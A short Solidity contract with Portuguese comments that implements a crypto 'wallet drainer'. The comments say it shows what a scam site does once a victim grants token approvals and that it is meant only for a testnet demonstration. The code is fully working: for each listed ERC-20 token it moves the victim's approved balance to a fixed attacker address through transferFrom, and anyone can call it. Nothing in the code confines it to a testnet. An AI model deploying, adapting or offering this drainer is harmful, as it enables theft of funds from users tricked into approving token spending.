// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title Drenador de demonstração.
/// @notice Reproduz o que um "site golpe" faz depois que a vítima aprova:
///         puxa, numa única transação, todos os tokens aprovados e envia ao
///         atacante. Existe só para a demonstração em testnet.
contract Drainer {
    address public immutable attacker;

    event Drained(address indexed victim, address indexed token, uint256 amount);

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// @dev Puxa o saldo inteiro de cada token que a vítima tenha aprovado.
    function drain(address victim, address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 t = IERC20(tokens[i]);
            uint256 bal = t.balanceOf(victim);
            uint256 allowed = t.allowance(victim, address(this));
            uint256 amount = bal < allowed ? bal : allowed;
            if (amount == 0) continue;
            t.transferFrom(victim, attacker, amount);
            emit Drained(victim, tokens[i], amount);
        }
    }
}
